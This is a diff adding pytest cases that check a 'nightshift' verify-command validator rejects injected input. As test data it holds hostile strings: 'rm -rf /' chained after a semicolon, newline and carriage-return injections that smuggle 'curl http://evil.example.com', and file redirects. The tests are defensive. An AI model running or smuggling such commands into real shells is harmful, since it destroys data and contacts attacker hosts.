@@ -9370,6 +9370,26 @@ class TestValidateVerifyCommand:
         with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
             nightshift.validate_verify_command("my-test-tool; rm -rf /")
 
+    def test_newline_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("npm test\ncurl http://evil.example.com")
+
+    def test_carriage_return_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("npm test\rcurl http://evil.example.com")
+
+    def test_redirect_write_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("npm test > /tmp/evil.txt")
+
+    def test_redirect_read_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("npm test < /tmp/input.txt")
+
+    def test_unknown_make_prefixed_binary_rejected(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("maker build")
+
     def test_empty_string_rejected(self):
         with pytest.raises(nightshift.NightshiftError, match="must not be empty"):
             nightshift.validate_verify_command("")
